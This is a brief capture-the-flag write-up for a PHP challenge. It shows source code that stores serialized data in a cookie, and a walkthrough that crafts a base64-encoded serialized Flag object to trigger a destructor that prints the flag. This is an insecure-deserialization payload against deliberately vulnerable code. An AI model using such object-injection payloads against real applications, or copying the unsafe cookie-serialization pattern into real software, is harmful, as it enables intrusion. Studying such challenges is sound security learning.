### Challenge description

Call me maybe

### Initial analysis
` <?php

include "flag.php";

class Flag {
    public function __destruct() {
       global $flag;
       echo $flag; 
    }
}

if (isset ($_POST['value']) and ! empty ($_POST['value'])) {
    /* Add a value twice to remove it from the list. */
    if (($key = array_search ($_POST['value'], $data)) !== false) {
        unset ($data[$key]);
    } else { /* Else, simply add it. */
        array_push ($data, $_POST['value']);
    }
    setcookie ('data', base64_encode (serialize ($data)));
}

?>`

### Walk through
STEP 1: Serialize the Flag class object with custom with Custom Object 
OUTPUT: C:4:"Flag":0:{}

STEP 2: Base64 Encode of Output 
OUTPUT: Qzo0OiJGbGFnIjowOnt9
